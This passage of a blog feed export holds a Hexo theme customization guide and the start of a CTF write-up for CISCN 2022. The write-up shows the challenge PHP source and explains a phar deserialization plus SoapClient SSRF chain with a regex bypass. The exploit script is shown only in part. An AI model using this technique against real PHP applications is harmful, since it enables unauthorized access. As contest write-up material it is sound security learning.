data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2luamFob3cvbWV0aW5nLWFwaQ==\">meting-api</span> 这个项目的）</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682841729/Typera/2023/04/f4f07901036b72746edf40bb804de698.png\" alt=\"image-20230430160205536\" /></p>\n<p>上图中的代码是经过更改的，原来有问题的地方是在： <code>/meting/api?server=</code> ，把 <code>api</code>  删掉就行了</p>\n<h3 id=\"tab标签favicon内容修改\"><a class=\"anchor\" href=\"#tab标签favicon内容修改\">#</a> TAB 标签 favicon 内容修改</h3>\n<p>shoka 主题下，离开和进入博客页面时，浏览器 TAB 标签的内容会做出更改，</p>\n<p>修改这些内容的方式是更改主题目录的 <code>language</code>  文件夹下的文件，以 <code>en.yml</code>  为例：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682843117/Typera/2023/04/d75d58621c39e3eec92653408e01f7fa.png\" alt=\"image-20230430162513720\" /></p>\n<p>修改这两行文字就行。</p>\n<h3 id=\"底部foot内容删改\"><a class=\"anchor\" href=\"#底部foot内容删改\">#</a> 底部 foot 内容删改</h3>\n<p>不是有意要删掉 <code>shokaX</code>  的链接，页脚再加上一行实在是有点丑陋，看在我写了这篇文章的份上就放过我吧  <code>&lt;(＿　＿)&gt;</code></p>\n<p>更改位置在主题目录下， <code>layout/_partials/footer.pug</code>  文件中</p>\n<p><code>pug</code>  文件还是简单易懂的，主要还是说一下增加的<span class=\"label success\">一言</span>功能：</p>\n<p>（API 链接来自 <span class=\"label primary\">hitokoto</span>）</p>\n<p>主要代码如下：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if theme.footer.sentences</span><br><span class=\"line\">    div(class=&quot;sentences-content&quot; id=&quot;sentences-content&quot;)</span><br><span class=\"line\">        = &#x27;一言...&#x27;</span><br><span class=\"line\">    div(class=&quot;sentences-from&quot; id=&quot;sentences-from&quot;)</span><br><span class=\"line\">        = &#x27;來源...&#x27;</span><br><span class=\"line\">    script(type=&quot;text/javascript&quot;).</span><br><span class=\"line\">        fetch(`https://v1.hitokoto.cn/`)</span><br><span class=\"line\">        .then(response =&gt; response.json())</span><br><span class=\"line\">        .then(data =&gt; &#123;</span><br><span class=\"line\">            var content = document.getElementById(&#x27;sentences-content&#x27;);</span><br><span class=\"line\">            content.innerText = data.hitokoto</span><br><span class=\"line\">            var from = document.getElementById(&#x27;sentences-from&#x27;);</span><br><span class=\"line\">            from.innerText = data.from + (data.from_who ? &#x27; · &#x27; + data.from_who : &#x27;&#x27;)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        .catch(console.error)</span><br></pre></td></tr></table></figure></p>\n<p>简单来说就是加了两个 <code>div</code> ，一个是一眼主体，一个是来源，分别给上  <code>id</code></p>\n<p>然后添加一个 <code>script</code> ，脚本中 <code>fetch</code>   <code>hitokoto</code>  的 API 地址，然后根据 <code>id</code>  找到对应的块，并使用 <code>innerText</code>  覆盖内容。</p>\n<h3 id=\"iconfont图标库添加\"><a class=\"anchor\" href=\"#iconfont图标库添加\">#</a> iconfont 图标库添加</h3>\n<p><code>shoka</code>  原作者给的方法是评论留言，等他看到之后，把你的用户加到他的项目里。</p>\n<p>因为是只读权限，所以你可以任意复制项目里的 <code>icon</code> ，再添加到你自己的项目中使用，最后再把配置文件中的 <code>iconfont</code>  一项改为自己项目的就行。</p>\n<p>但是这要建立在作者看到你的评论留言的基础上，鉴于他现在已经停止更新了...</p>\n<p>所以建议按照我的方法直接改改主题文件更合适一点，而且我的方法也简单粗暴。</p>\n<ol>\n<li>\n<p>首先，先配好 <code>iconfont</code>  的项目设置： <code>FontClass/Symbol 前缀</code> 改为 <code>i-</code> ， <code>Font Family</code>  改为 <code>ic</code> ，<br />\n记得重新生成一下在线链接。</p>\n</li>\n<li>\n<p>然后回到 hexo 中，配置文件中的 <code>iconfont</code>  下面加一个 <code>iconfont_plus</code>  的配置，名字随意，看着改就行</p>\n</li>\n<li>\n<p>然后找到主题目录下的 <code>source/css/</code>  文件夹，创建一个叫做 <code>_iconfont_plus.styl</code>  的文件，文件的内容就是你的 <code>iconfont</code>  项目在线链接的最后部分：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682844808/Typera/2023/04/8cc09958217b38bce3b8f9affe55f60e.png\" alt=\"image-20230430165324891\" /></p>\n</li>\n<li>\n<p>找到主题目录下的 <code>scripts/generaters/config.js</code>  文件，如下位置添加一个 <code>'iconfont_plus'</code> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682844981/Typera/2023/04/338e079adcf6f44d6edfc2c6ae9b54d4.png\" alt=\"image-20230430165616689\" /><br />\n（加了这个之后，就可以在主题目录之外修改了，根目录下增加文件 <code>source/_data/iconfont_plus.styl</code> ，但<strong>也可以不加</strong>)</p>\n</li>\n<li>\n<p>找到主题目录下的 <code>source/css/_variables.styl</code>  文件，增加：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682845300/Typera/2023/04/0c5218d4823d0c93f8b4d04589599140.png\" alt=\"image-20230430170136594\" /></p>\n</li>\n<li>\n<p>接下来修改同文件夹下的 <code>app.styl</code>  文件，这一步将 <code>iconfont</code>  项目的 <code>css</code>  文件 <code>import</code>  进了主文件<br />\n添加代码：</p>\n<p><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if $_iconfont_plus = hexo-config(&#x27;style<span class=\"selector-class\">.iconfont_plus</span>&#x27;)</span><br><span class=\"line\">  <span class=\"keyword\">@import</span> $_iconfont_plus;</span><br><span class=\"line\">else</span><br><span class=\"line\">  <span class=\"keyword\">@import</span> <span class=\"string\">&quot;_iconfont_plus&quot;</span>;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>最后修改 <code>source/css/_common/scaffolding/base.styl</code>  文件中，</p>\n<p>添加代码：</p>\n<p><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;ic&#x27;</span>;</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.eot&#x27;</span>);</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.eot?#iefix&#x27;</span>) <span class=\"built_in\">format</span>(<span class=\"string\">&#x27;embedded-opentype&#x27;</span>),</span><br><span class=\"line\">  <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.woff2&#x27;</span>) <span class=\"built_in\">format</span>(<span class=\"string\">&#x27;woff2&#x27;</span>),</span><br><span class=\"line\">  <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.woff&#x27;</span>) <span class=\"built_in\">format</span>(<span class=\"string\">&#x27;woff&#x27;</span>),</span><br><span class=\"line\">  <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.ttf&#x27;</span>) <span class=\"built_in\">format</span>(<span class=\"string\">&#x27;truetype&#x27;</span>),</span><br><span class=\"line\">  <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;//at.alicdn.com/t/c/font_&#x27;</span><span class=\"string\"> + $iconfont_plus + &#x27;.svg#ic&#x27;</span>) <span class=\"built_in\">format</span>(<span class=\"string\">&#x27;svg&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 注意，这一步中要检查你的 <code>iconfont</code>  项目在线链接是否和此处的匹配，若不匹配需要修改。</p>\n</li>\n</ol>\n<p>现在可以自由添加 icon 了，格式为： <code>&lt;i class=&quot;ic i-subway&quot;&gt; &lt;/i&gt;</code> 。</p>\n<p>我们只需要将新增的 icon 添加到自己的项目，然后更新一下在线链接，最后修改一下配置文件中 <code>iconfont_plus</code>  的内容。</p>\n<div class=\"note success\">\n<p>祝：食用愉快</p>\n</div>\n",
            "tags": [
                "Hexo",
                "shokaX",
                "博客主题",
                "Develop"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/BxsTeam-Ciscn2022-WP/",
            "title": "BxsTeam Ciscn2022 WP",
            "date_published": "2022-06-20T11:23:14.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"1welcometociscn\"><a class=\"anchor\" href=\"#1welcometociscn\">#</a> 1.welcomeToCiscn</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwNS9mbGFn\">http://192.168.166.147:58005/flag</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/fdc13e831337fd37296da62226314d5c.png\" alt=\"image-20220619093945836\" /></p>\n<p 61ee5435b6f59d42329ac2644d887dc2=\"\">flag</p>\n<h3 id=\"2ezphp\"><a class=\"anchor\" href=\"#2ezphp\">#</a> 2.ezphp</h3>\n<p>WEB 手用 QQ 就能做题，提交 flag 格式：flag {xxxx}，该题环境的 ip 为:web - 模板机 get_ip 的 ip，端口为：58003</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMTY2LjE0Nzo1ODAwMw==\">http://192.168.166.147:58003</span></p>\n<p>打开题目就跳转到腾讯网页面，F12 流量监控也没找到题目正常的返回数据，就用了 Burp 代理</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/71b04071868e94c14ab68545511866d3.png\" alt=\"image-20220619194519069\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1CdXJwd3d3LXZwNGtqNnlmOWR3dDRiY2pibDhzbjEzYjd4NGFvcjNnLnFxLmNvbQ==\">打开 Burp 看到流量发往了 www.qq.com</span>, 手动修改了一下流量目的地址和请求头 host</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444983/Typera/2023/04/404af43648ff7e40324818cb9d0a9580.png\" alt=\"image-20220619194841691\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/6196e0859e1cc306b89e66254f983d62.png\" alt=\"image-20220619195032081\" /></p>\n<p>可以看到这回一个提供文件上传接口的地方，访问一下 <code>upload.php</code>  可以得到源码，但一些字符被 html 编码</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/128a44607394d2e48e0b6fa71a7ac246.png\" alt=\"image-20220619195647524\" /></p>\n<p>到本地写 html 页面访问即可得到源码:</p>\n<p>upload.php</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class=\"comment\">//设置编码</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;max_execution_time&quot;</span>,<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>])&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmp</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$tmp</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/&lt;\\?|php/i&quot;</span>, <span class=\"variable\">$content</span> ))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;go away!!!! hacker&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$filepath</span>=<span class=\"string\">&quot;storage/&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span> )&#123;</span><br><span class=\"line\">        <span class=\"variable\">$random_name</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">time</span>()), <span class=\"number\">0</span>, <span class=\"number\">8</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$filepath</span>.<span class=\"variable\">$random_name</span>.<span class=\"string\">&quot;.gif&quot;</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传成功:路径在: ./&quot;</span>.<span class=\"variable\">$filepath</span>.<span class=\"variable\">$random_name</span>.<span class=\"string\">&quot;.gif&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传失败&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;invalid gif&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkimg</span>(<span class=\"params\"><span class=\"variable\">$img</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$check</span>=<span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$img</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"variable\">$check</span>!=<span class=\"literal\">false</span>) &amp;&amp; (<span class=\"variable\">$check</span>[<span class=\"string\">&#x27;mime&#x27;</span>] == <span class=\"string\">&#x27;image/gif&#x27;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;safe image&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;go away hacker&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$img</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;img&quot;</span>];    </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$img</span>))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">checkimg</span>(<span class=\"variable\">$img</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>config.php</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbhost&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbusername&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbpasswd&#x27;</span>]))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbhost=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbhost&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbusername=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbusername&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;dbpasswd=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dbpasswd&#x27;</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">mysqli</span>(<span class=\"variable\">$this</span>-&gt;dbhost,<span class=\"variable\">$this</span>-&gt;dbusername,<span class=\"variable\">$this</span>-&gt;dbpasswd);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;conn-&gt;connect_error)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Connection failed: <span class=\"subst\">&#123;$this-&gt;conn-&gt;connect_error&#125;</span>&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$result</span>=<span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;select * from test&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_resource</span>(<span class=\"variable\">$result</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$result</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn-&gt;<span class=\"title function_ invoke__\">close</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>这里提示了 flag.php 访问一下可以直接得到源码:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] == <span class=\"string\">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure></p>\n<p>分析:</p>\n<ol>\n<li>upload.php\n<ol>\n<li>文件类型为 <code>image/gif</code>  且不被正则 <code>&quot;/&lt;\\?|php/i&quot;</code>  匹配到的时候会将文件上上传到 <code>storage/xxxxxxxx.gif</code></li>\n<li>如果有 img 参数的时候会使用 <code>getimagesize</code>  函数获取图片信息</li>\n</ol>\n</li>\n<li>config.php\n<ol>\n<li>只有一个类：Mysql</li>\n<li>它的 connect 函数不可用，能利用的函数只有 <code>__destruct</code> , 在它里面调用了关闭连接的函数 <code>$this-&gt;conn-&gt;close();</code></li>\n</ol>\n</li>\n<li>flag.php\n<ol>\n<li>这里会将 flag 复制到 flag.txt 中，但是必须本地访问才行</li>\n</ol>\n</li>\n</ol>\n<p>解题思路:</p>\n<ol>\n<li>首先明确最后目标：实现 <code>127.0.0.1</code>  访问 <code>flag.php</code></li>\n<li>文件内容正则匹配 php 并且有 <code>getimagesize</code>  函数就很自然想到 phar 反序列化</li>\n<li>反序列化什么类呢？这里给了 <code>Mysql</code>  类，就从它入手，结合最终目的 <code>SSRF</code>  想到原生类利用中的 <code>SoapClient</code> , 销毁函数会调用 <code>conn</code>  成员的 <code>close</code>  函数，就满足 <code>SoapClient</code>  的 <code>__call</code>  函数执行条件</li>\n</ol>\n<p>最终得到解题步骤:</p>\n<ol>\n<li>构造一个 Mysql 对象，让它的 <code>conn</code>  成员访问 <code>http://127.0.0.1/flag.php</code>  的 <code>SoapClient</code>  对象</li>\n<li>将得到的对象放入 Phar 文件的 <code>Metadata</code>  数据段</li>\n<li>为了绕过正则过滤，将原始的 phar 压缩为 <code>.tar.gz</code></li>\n</ol>\n<p>构造实现脚本:</p>\n<p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$conn</span>, <span class=\"variable\">$dbhost</span>, <span class=\"variable\">$dbusername</span>, <span class=\"variable\">$dbpasswd</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;conn = <span class=\"variable\">$conn</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbhost = <span class=\"variable\">$dbhost</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbusername = <span class=\"variable\">$dbusername</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;dbpasswd = <span class=\"variable\">$dbpasswd</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destory</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        @<span class=\"title function_ 